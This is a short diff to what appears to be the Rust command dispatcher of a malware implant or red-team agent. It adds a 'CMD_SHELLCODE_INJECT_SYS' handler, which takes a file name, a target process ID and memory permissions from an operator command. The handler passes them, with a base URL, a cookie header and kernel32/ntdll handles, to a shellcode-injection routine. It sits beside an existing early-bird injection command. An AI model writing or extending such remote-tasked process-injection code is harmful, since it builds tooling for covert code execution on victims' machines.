@@ -136,6 +136,20 @@ fn process_command(
                 ntdll,
             );
         }
+        "CMD_SHELLCODE_INJECT_SYS" => {
+            let file_name = cmd_vec[2];
+            let pid: u32 = cmd_vec[3].parse().unwrap();
+            let mem_perms = cmd_vec[4];
+            return commands::command::shellcode_inject_sys(
+                base_url,
+                cookie_header,
+                file_name,
+                pid,
+                mem_perms,
+                kernel32,
+                ntdll,
+            );
+        }
         "CMD_SHELLCODE_EARLYBIRD" => {
             let file_name = cmd_vec[2];
             let mem_perms = cmd_vec[3];
